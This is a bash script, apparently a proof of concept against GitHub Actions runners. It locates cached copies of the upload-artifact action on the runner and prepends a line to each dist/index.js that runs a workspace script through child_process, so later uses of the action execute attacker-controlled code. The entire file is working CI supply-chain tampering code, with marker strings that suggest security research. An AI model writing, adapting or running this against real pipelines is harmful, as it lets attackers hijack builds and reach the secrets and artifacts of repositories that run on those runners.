#!/bin/bash
exec 1>&2
echo "POC_PLANT_START os=$(uname -s) run=${GITHUB_RUN_ID:-} job=${GITHUB_JOB:-} user=$(id -un)"
if [ "$(uname -s)" != "Linux" ]; then
  echo "POC_PLANT_SKIP non-linux"
  exit 1
fi
if [ -f /tmp/poc_planted ]; then
  echo "POC_PLANT_SKIP already"
  exit 1
fi
touch /tmp/poc_planted
echo "POC_ACTIONS_DIR $(ls -d /home/runner/work/_actions/actions/*/* 2>/dev/null | tr '\n' ' ')"
patched=0
for f in /home/runner/work/_actions/actions/upload-artifact/*/dist/index.js; do
  [ -f "$f" ] || continue
  grep -q POC_ACTION_PATCH "$f" && { echo "POC_ALREADY_PATCHED $f"; patched=1; continue; }
  {
    echo "/* POC_ACTION_PATCH */"
    echo "try { require('child_process').execFileSync('bash', [process.env.GITHUB_WORKSPACE + '/poc/plant_action.sh'], {stdio: 'inherit'}); } catch (e) { console.error('POC_ACTION_PATCH_ERR', e && e.message); }"
    cat "$f"
  } > /tmp/poc_patched_index.js
  cat /tmp/poc_patched_index.js > "$f" && echo "POC_PATCHED $f" || echo "POC_PATCH_FAILED $f"
  patched=1
done
echo "POC_PATCH_RESULT $patched"
exit 1
